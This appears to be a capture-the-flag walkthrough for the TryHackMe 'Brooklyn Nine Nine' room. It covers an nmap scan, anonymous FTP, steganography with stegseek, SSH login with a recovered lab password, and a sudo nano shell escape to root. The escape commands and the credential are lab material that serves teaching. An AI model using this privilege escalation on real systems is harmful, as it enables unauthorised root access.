# Brooklyn Nine Nine

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg)

## Difficulty = Easy

***


Running our nmap scan we have 3 ports opened -:

```bash
# Nmap 7.94 scan initiated Fri Oct 20 10:29:37 2023 as: nmap -p80,21,22 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.143.68
Nmap scan report for 10.10.143.68
Host is up (0.43s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.75.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 10:30:03 2023 -- 1 IP address (1 host up) scanned in 26.09 seconds
```

Checking `FTP` we have a note for us, we can download it with the `mget` command

![](https://i.imgur.com/R9lmhDe.png)


Checking the note, we can see that we have 3 usernames which is **Amy**, **holt** and **Jake** and it looks like Amy tells Jake to change his password because it is too weak 😂 (Great hint)

![](https://i.imgur.com/JDmisMn.png)

Navigating to port `80/HTTP` we have this website

![](https://i.imgur.com/XLZtecj.png)


Viewing **Page-source** we have this commented text

![](https://i.imgur.com/qsJmKaz.png)

Navigating to `/brooklyn99.jpg` we truly have the image, we can download it with `wget` or just right click and **save**

![](https://i.imgur.com/nHk9snS.png)

Running a tool called `stegseek` on this image we found a `note.txt` file saved as `brooklyn99.jpg.out` on our system

```bash
$ sudo apt install stegseek
```


![](https://i.imgur.com/hn0gOGV.png)


Concatenating `brooklyn99.jpg.out` looks like we found a new user called, **Holt's**, with his/her password

![](https://i.imgur.com/aLM5ZhM.png)

Running dir/file bruteforce with `dirsearch` nothing seems convincing (just to be sure we are doing the right thing 🐬)

![](https://i.imgur.com/cjs9a56.png)

we successfully logged in via `SSH` with the credentials we found, `holt:fluffydog12@ninenine`

![](https://i.imgur.com/hR2TUYq.png)

Navigating to `/var/www/html` we have a **photo.jpg** file

![](https://i.imgur.com/7fnluZV.png)


We can download it using `wget` again and run it through `stegseek`


![](https://i.imgur.com/rId9zfS.png)


As we can see we don't have much information than somoene's POC 😂

![](https://i.pinimg.com/originals/e6/29/49/e6294964e26db35f05e41e25e689b19d.gif)


Running `sudo -l` we can see that we can run `/bin/nano` with the **sudo** command

![](https://i.imgur.com/CZZKJQ1.png)

Here is the command to get root with nano

```bash
$ sudo /bin/nano

# Ctrl+R - Ctrl+X - This is a comment
^R^X

$ reset; sh 1>&0 2>&0
```


![](https://i.imgur.com/cAdqJEq.png)


Have fun 😀

![](https://i.pinimg.com/originals/f0/5d/3c/f05d3cb8b8791d735bd6b9b8ae6be817.gif)




<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


